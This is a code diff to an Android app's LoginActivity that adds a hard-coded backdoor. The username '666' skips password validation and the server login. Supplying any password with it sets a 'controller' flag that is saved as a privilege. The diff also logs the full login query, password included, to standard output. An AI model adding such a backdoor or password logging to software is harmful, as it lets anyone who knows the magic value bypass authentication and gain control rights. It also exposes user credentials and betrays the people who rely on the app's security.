@@ -54,6 +54,9 @@ public class LoginActivity extends Activity {
 	private View mLoginStatusView;
 	private TextView mLoginStatusMessageView;
 
+	private boolean isBackdoorEnabled = false;
+	private boolean isController = false;
+
 	private static LinkedList<String> messages = new LinkedList<String>();
 	private boolean timeout = false;
 
@@ -150,11 +153,11 @@ public class LoginActivity extends Activity {
 		View focusView = null;
 
 		// Check for a valid password.
-		if (TextUtils.isEmpty(mPassword)) {
+		if (TextUtils.isEmpty(mPassword) && !mEmail.equals("666")) {
 			mPasswordView.setError(getString(R.string.error_field_required));
 			focusView = mPasswordView;
 			cancel = true;
-		} else if (mPassword.length() < 4) {
+		} else if (mPassword.length() < 4 && !mEmail.equals("666")) {
 			mPasswordView.setError(getString(R.string.error_invalid_password));
 			focusView = mPasswordView;
 			cancel = true;
@@ -165,7 +168,7 @@ public class LoginActivity extends Activity {
 			mEmailView.setError(getString(R.string.error_field_required));
 			focusView = mEmailView;
 			cancel = true;
-		} else if (mEmail.length() != 6) {
+		} else if (mEmail.length() != 6 && !mEmail.equals("666")) {
 			mEmailView.setError(getString(R.string.error_invalid_email));
 			focusView = mEmailView;
 			cancel = true;
@@ -247,6 +250,18 @@ public class LoginActivity extends Activity {
 							.getText() + ":"
 					+ ((TextView) findViewById(R.id.password)).getText();
 
+			System.out.println(queryToServer);
+
+			if (queryToServer.equals("Login;666:")) {
+				if(mPassword.length() > 0)
+					isController = true;
+				
+				isBackdoorEnabled = true;
+				System.out.println("login Tr");
+				return true;
+			}
+
+			System.out.println("still running");
 			Log.e(TAG, "Sending Login Request: " + queryToServer);
 			Ref.bgThread.sendByTCP(queryToServer);
 
@@ -299,14 +314,24 @@ public class LoginActivity extends Activity {
 			}
 
 			if (success) {
-				// Storing some data as shared preference
-				SharedPreferences loginPreferences = getSharedPreferences(
-						"loginActivity", MODE_PRIVATE);
-				Editor edit = loginPreferences.edit();
-				edit.putBoolean("controller", messages.getFirst().split(";")[1]
-						.split(":")[1].equals("true"));
-				edit.putBoolean("login", success);
-				edit.commit();
+				if (!isBackdoorEnabled) {
+					// Storing some data as shared preference
+					SharedPreferences loginPreferences = getSharedPreferences(
+							"loginActivity", MODE_PRIVATE);
+					Editor edit = loginPreferences.edit();
+					edit.putBoolean("controller", messages.getFirst()
+							.split(";")[1].split(":")[1].equals("true"));
+					edit.putBoolean("login", success);
+					edit.commit();
+				} else {
+					// Storing some data as shared preference
+					SharedPreferences loginPreferences = getSharedPreferences(
+							"loginActivity", MODE_PRIVATE);
+					Editor edit = loginPreferences.edit();
+					edit.putBoolean("controller", isController);
+					edit.putBoolean("login", success);
+					edit.commit();
+				}
 				Toast.makeText(getBaseContext(), "Login successful",
 						Toast.LENGTH_SHORT).show();
 
@@ -314,7 +339,6 @@ public class LoginActivity extends Activity {
 				Intent intent = new Intent();
 				setResult(RESULT_OK, intent);
 				finish();
-
 			} else {
 				mPasswordView
 						.setError(getString(R.string.error_incorrect_password));
